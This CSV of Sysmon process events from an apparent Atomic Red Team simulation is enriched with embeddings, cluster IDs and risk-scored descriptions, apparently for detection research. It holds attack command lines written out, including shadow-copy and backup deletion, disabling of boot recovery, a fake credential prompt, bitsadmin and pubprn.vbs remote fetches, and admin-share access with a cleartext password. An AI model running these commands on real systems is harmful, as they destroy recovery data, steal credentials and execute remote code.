Timestamp,Computer,Provider,EventID,CommandLine,Embedding,Cluster_DBSCAN,Cluster_KMeans,DBSCANClusterDescription,DBSCANClusterRiskScore
2019-07-19T14:45:55.681219Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,"""C:\Windows\system32\cmd.exe"" /c ""C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe /U T1121.dll""","[-0.01642048  0.00669434  0.01962297 ...  0.00488968  0.0033798
  0.01267506]",0,106,"Execution of adversarial simulation commands including persistence via scheduled tasks, remote script execution using Regsvr32 and CMSTP, and system discovery.",9
2019-07-19T14:45:55.699293Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe  /U T1121.dll,"[-0.02867938 -0.0028392   0.00876436 ...  0.00389651  0.00355252
  0.00364293]",0,106,"Execution of adversarial simulation commands including persistence via scheduled tasks, remote script execution using Regsvr32 and CMSTP, and system discovery.",9
2019-07-19T14:45:56.033241Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,"""C:\Windows\system32\cmd.exe"" /c ""del T1121.dll""","[-0.02379204  0.00894259  0.00685467 ...  0.01142014  0.00034522
  0.01471115]",0,114,"Execution of adversarial simulation commands including persistence via scheduled tasks, remote script execution using Regsvr32 and CMSTP, and system discovery.",9
2019-07-19T14:46:19.052666Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,"""C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe"" /r:System.EnterpriseServices.dll /target:library /keyfile:key.snk C:\AtomicRedTeam\atomics\T1121\src\T1121.cs","[-0.00654053 -0.00318897  0.02194052 ...  0.00564213 -0.00437
  0.012493  ]",2,131,"Compilation of C# source code using the native .NET csc.exe tool to target System.EnterpriseServices, specifically associated with MITRE ATT&CK technique T1121 (Regsvcs/Regasm) for defense evasion.",8
2019-07-19T14:46:19.443587Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,"C:\Windows\Microsoft.NET\Framework\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 ""/OUT:C:\Users\IEUser\AppData\Local\Temp\RES1BEA.tmp"" ""c:\AtomicRedTeam\CSC8EBD65DB33242A1BAD76494F485AF42.TMP""","[-0.01012256  0.01164457  0.01434256 ...  0.0134323  -0.0013951
 -0.00355561]",3,124,"Execution of .NET Resource to Object Converter (cvtres.exe) for resource compilation, specifically targeting files within an Atomic Red Team simulation directory.",6
2019-07-19T14:46:19.484316Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,"""C:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe"" T1121.dll","[-0.02627245 -0.0138524   0.01324871 ...  0.00028011 -0.00249214
  0.01010956]",0,106,"Execution of adversarial simulation commands including persistence via scheduled tasks, remote script execution using Regsvr32 and CMSTP, and system discovery.",9
2019-07-19T14:46:51.883827Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,"""C:\Windows\system32\cmd.exe"" /c ""powershell.exe -command { = System.Management.Automation.Internal.Host.InternalHost.UI.PromptForCredential('Windows Security Update', '',[Environment]::UserName, [Environment]::UserDomainName); echo .GetNetworkCredential().Password;}""","[-0.00493161  0.02830731  0.02637148 ...  0.00324643  0.00436535
  0.00438897]",4,62,Credential phishing via PowerShell using fake system update prompts to capture user passwords.,9
2019-07-19T14:46:51.957887Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,"powershell.exe  -command { = System.Management.Automation.Internal.Host.InternalHost.UI.PromptForCredential('Windows Security Update', '',[Environment]::UserName, [Environment]::UserDomainName); echo .GetNetworkCredential().Password;}","[-0.01550474  0.01706073  0.01951736 ... -0.00267305  0.00537245
  0.00442231]",4,62,Credential phishing via PowerShell using fake system update prompts to capture user passwords.,9
2019-07-19T14:47:37.096237Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,"""C:\Windows\system32\cmd.exe"" /c ""reg.exe import c:\AtomicRedTeam\atomics\T1103\T1103.reg""","[ 0.01685228  0.01350814  0.03478389 ... -0.00294006 -0.01231051
  0.00813722]",5,202,Registry modification via reg.exe import targeting potential persistence mechanisms (T1103/AppInit_DLLs) within a security testing framework.,8
2019-07-19T14:47:37.127263Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,reg.exe  import c:\AtomicRedTeam\atomics\T1103\T1103.reg,"[ 0.00996788  0.00776482  0.03471269 ... -0.00166979 -0.00701765
  0.00170517]",5,202,Registry modification via reg.exe import targeting potential persistence mechanisms (T1103/AppInit_DLLs) within a security testing framework.,8
2019-07-19T14:47:40.691438Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,"""C:\Windows\system32\cmd.exe"" /c ""vssadmin.exe delete shadows /all /quiet""","[-0.00541872  0.02385544  0.00065201 ...  0.01106907  0.00117547
 -0.00055329]",6,164,"Volume Shadow Copy manipulation and deletion using vssadmin, a technique commonly used by ransomware to prevent data recovery.",9
2019-07-19T14:47:40.706040Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,vssadmin.exe  delete shadows /all /quiet,"[-0.01841899  0.01160281 -0.01287771 ...  0.00803384 -0.00239393
 -0.00152984]",6,53,"Volume Shadow Copy manipulation and deletion using vssadmin, a technique commonly used by ransomware to prevent data recovery.",9
2019-07-19T14:47:45.585327Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,"""C:\Windows\system32\cmd.exe"" /c ""wbadmin.exe delete catalog -quiet""","[-0.02152316  0.01551837  0.02408596 ...  0.01657937  0.00292836
 -0.00357854]",7,220,"Execution of wbadmin to delete the backup catalog, frequently associated with ransomware inhibiting system recovery.",9
2019-07-19T14:47:45.624944Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,wbadmin.exe  delete catalog -quiet,"[-0.02872646  0.00628547  0.00859153 ...  0.01381773 -0.00141775
 -0.00638436]",7,220,"Execution of wbadmin to delete the backup catalog, frequently associated with ransomware inhibiting system recovery.",9
2019-07-19T14:47:45.773400Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,"""C:\Windows\system32\wbengine.exe""","[-0.00819161  0.02987537  0.02564865 ...  0.01635141 -0.00643474
 -0.00710378]",89,219,"Windows system administrative utilities involving the Block Level Backup Engine and the Windows Store Reset tool, potentially indicating system maintenance or UAC bypass exploitation.",5
2019-07-19T14:47:45.958874Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,C:\Windows\System32\vds.exe,"[-3.1755057e-03  1.4058885e-02  2.4584662e-02 ...  8.3546260e-03
  1.2166363e-03 -3.4799577e-05]",97,219,Native Windows diagnostic and system maintenance binaries typically associated with standard background OS activity.,3
2019-07-19T14:47:51.816821Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,"""C:\Windows\system32\cmd.exe"" /c ""bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures""","[-0.00120598  0.03924103  0.02012588 ...  0.01188716  0.00654183
 -0.0009583 ]",8,207,"Modification of Boot Configuration Data (BCD) to disable automatic recovery and ignore boot failures, frequently associated with ransomware activities.",9
2019-07-19T14:47:51.865963Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,bcdedit.exe  /set {default} bootstatuspolicy ignoreallfailures,"[-0.00809779  0.0355917   0.01348511 ...  0.00998294  0.00825555
 -0.00631706]",8,207,"Modification of Boot Configuration Data (BCD) to disable automatic recovery and ignore boot failures, frequently associated with ransomware activities.",9
2019-07-19T14:47:51.997980Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,"""C:\Windows\system32\cmd.exe"" /c ""bcdedit.exe /set {default} recoveryenabled no""","[-0.01058838  0.02985468  0.02374687 ...  0.01246452  0.00115473
  0.00596406]",8,64,"Modification of Boot Configuration Data (BCD) to disable automatic recovery and ignore boot failures, frequently associated with ransomware activities.",9
2019-07-19T14:47:52.010791Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,bcdedit.exe  /set {default} recoveryenabled no,"[-0.02090955  0.01781215  0.01683271 ...  0.01258574  0.00239476
  0.00283196]",8,64,"Modification of Boot Configuration Data (BCD) to disable automatic recovery and ignore boot failures, frequently associated with ransomware activities.",9
2019-07-19T14:47:57.227966Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,"""C:\Windows\system32\cmd.exe"" /c ""sdelete.exe C:\some\file.txt""","[-0.02112293  0.03332522  0.02885769 ...  0.01026463 -0.00528903
 -0.00198475]",109,129,"Activities focused on defense evasion via Sysmon driver unloading, data staging using WinRAR, and anti-forensics through secure file deletion.",10
2019-07-19T14:48:04.103366Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,"""C:\Windows\system32\cmd.exe"" /c ""bitsadmin.exe  /transfer /Download /priority Foreground https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md C:\Windows\Temp\bitsadmin_flag.ps1""","[-0.00403263  0.01483905  0.01065807 ... -0.00115451 -0.01016534
 -0.00983902]",9,122,Use of BITSAdmin for BITS Job persistence and remote file retrieval (T1197) involving Atomic Red Team adversary simulation scripts.,8
2019-07-19T14:48:04.131410Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,bitsadmin.exe   /transfer /Download /priority Foreground https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md C:\Windows\Temp\bitsadmin_flag.ps1,"[-0.00128953  0.0077439   0.00936106 ... -0.00316761 -0.00851183
 -0.01472013]",9,122,Use of BITSAdmin for BITS Job persistence and remote file retrieval (T1197) involving Atomic Red Team adversary simulation scripts.,8
2019-07-19T14:48:30.640915Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,"""C:\Windows\system32\cmd.exe"" /c ""bitsadmin.exe /create AtomicBITS""",[0.0019799  0.02366062 0.02335926 ... 0.00807439 0.00572992 0.00699535],9,44,Use of BITSAdmin for BITS Job persistence and remote file retrieval (T1197) involving Atomic Red Team adversary simulation scripts.,8
2019-07-19T14:48:30.660877Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,bitsadmin.exe  /create AtomicBITS,"[-0.00081956  0.0198152   0.02750906 ... -0.00501567  0.01122002
 -0.00087585]",9,44,Use of BITSAdmin for BITS Job persistence and remote file retrieval (T1197) involving Atomic Red Team adversary simulation scripts.,8
2019-07-19T14:48:30.799468Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,"""C:\Windows\system32\cmd.exe"" /c ""bitsadmin.exe /addfile AtomicBITS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md C:\Windows\Temp\bitsadmin_flag.ps1""","[-0.00967362  0.00849879  0.01447449 ... -0.00046016 -0.00569337
 -0.00789823]",9,122,Use of BITSAdmin for BITS Job persistence and remote file retrieval (T1197) involving Atomic Red Team adversary simulation scripts.,8
2019-07-19T14:48:30.807486Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,bitsadmin.exe  /addfile AtomicBITS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md C:\Windows\Temp\bitsadmin_flag.ps1,"[-0.0087039   0.00227588  0.01388331 ... -0.00235876 -0.00397813
 -0.01168475]",9,122,Use of BITSAdmin for BITS Job persistence and remote file retrieval (T1197) involving Atomic Red Team adversary simulation scripts.,8
2019-07-19T14:48:30.900988Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,"""C:\Windows\system32\cmd.exe"" /c ""bitsadmin.exe /setnotifycmdline AtomicBITS C:\Windows\system32\notepad.exe C:\Windows\Temp\bitsadmin_flag.ps1""","[-0.00489714  0.01205937  0.0160261  ...  0.00571539  0.01189324
  0.00920004]",9,12,Use of BITSAdmin for BITS Job persistence and remote file retrieval (T1197) involving Atomic Red Team adversary simulation scripts.,8
2019-07-19T14:48:30.917348Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,bitsadmin.exe  /setnotifycmdline AtomicBITS C:\Windows\system32\notepad.exe C:\Windows\Temp\bitsadmin_flag.ps1,"[-0.00572592  0.0088457   0.01504269 ... -0.00654383  0.01294324
  0.00616508]",9,12,Use of BITSAdmin for BITS Job persistence and remote file retrieval (T1197) involving Atomic Red Team adversary simulation scripts.,8
2019-07-19T14:48:31.012222Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,"""C:\Windows\system32\cmd.exe"" /c ""bitsadmin.exe /complete AtomicBITS""","[-0.00477342  0.02340966  0.01934556 ...  0.01390015  0.00630051
  0.0041138 ]",9,44,Use of BITSAdmin for BITS Job persistence and remote file retrieval (T1197) involving Atomic Red Team adversary simulation scripts.,8
2019-07-19T14:48:31.041710Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,bitsadmin.exe  /complete AtomicBITS,"[-0.01701224  0.02301816  0.01761171 ...  0.00616079  0.00831405
 -0.00483746]",9,154,Use of BITSAdmin for BITS Job persistence and remote file retrieval (T1197) involving Atomic Red Team adversary simulation scripts.,8
2019-07-19T14:48:31.134374Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,"""C:\Windows\system32\cmd.exe"" /c ""bitsadmin.exe /resume AtomicBITS""","[-0.00276048  0.02602815  0.01627063 ...  0.01893111  0.01021579
 -0.00228721]",9,154,Use of BITSAdmin for BITS Job persistence and remote file retrieval (T1197) involving Atomic Red Team adversary simulation scripts.,8
2019-07-19T14:48:31.157171Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,bitsadmin.exe  /resume AtomicBITS,"[-0.01613951  0.0270082   0.01052248 ...  0.00602273  0.01305416
 -0.00593298]",9,154,Use of BITSAdmin for BITS Job persistence and remote file retrieval (T1197) involving Atomic Red Team adversary simulation scripts.,8
2019-07-19T14:48:36.834888Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,"""C:\Windows\system32\cmd.exe"" /c ""cscript.exe /b C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs localhost "" script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1216/payloads/T1216.sct","[-0.00318581 -0.00472584  0.00300291 ...  0.00940273  0.00701127
 -0.00060281]",10,101,"Abuse of the legitimate pubprn.vbs script to execute remote scriptlets (T1216), typically for proxying malicious code execution.",9
2019-07-19T14:48:36.882586Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,cscript.exe  /b C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs localhost  script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1216/payloads/T1216.sct,"[-0.0041445  -0.01067515  0.00244    ...  0.00675356  0.01076342
 -0.00491822]",10,101,"Abuse of the legitimate pubprn.vbs script to execute remote scriptlets (T1216), typically for proxying malicious code execution.",9
2019-07-19T14:48:41.050661Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,"""C:\Windows\system32\cmd.exe"" /c ""cmd.exe /c "" net use \\Target\C$ P@ssw0rd1 /u:DOMAIN\Administrator","[-0.00537307  0.03426273  0.01091414 ...  0.00490696  0.00299508
 -0.00703539]",11,70,Lateral movement attempts targeting administrative shares (C$) using cleartext credentials for a Domain Administrator account.,10
2019-07-19T14:48:41.085108Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,cmd.exe  /c  net use \\Target\C$ P@ssw0rd1 /u:DOMAIN\Administrator,"[-0.0145461   0.03191348  0.00969545 ...  0.0018368   0.00468025
 -0.00569128]",11,70,Lateral movement attempts targeting administrative shares (C$) using cleartext credentials for a Domain Administrator account.,10
2019-07-19T14:48:41.109076Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,net  use \\Target\C$ P@ssw0rd1 /u:DOMAIN\Administrator,"[-1.9272808e-02  2.8302602e-02  5.4317115e-05 ...  8.3024683e-04
  7.1477570e-03 -1.1316370e-02]",11,70,Lateral movement attempts targeting administrative shares (C$) using cleartext credentials for a Domain Administrator account.,10
2019-07-19T14:48:57.466584Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,"""C:\Windows\system32\cmd.exe"" /c ""echo "" ""ATOMICREDTEAM > %%windir%%\cert.key""","[-0.00465735  0.0071828   0.03618488 ...  0.00401904 -0.01756098
 -0.0022046 ]",110,46,Simulated credential dumping using ntdsutil and Atomic Red Team framework testing.,8
2019-07-19T14:48:57.524876Z,MSEDGEWIN10,Microsoft-Windows-Sysmon,1,"""C:\Windows\system32\cmd.exe"" /c ""dir c:\ /b /s .key | findstr /e .key""","[-0.01459465  0.02888985  0.01615277 ...  0.02055146 -0.003572
 -0.00318434]",12,98,System-wide recursive discovery and staging of sensitive file types including keys and documents for potential data exfiltration.,8
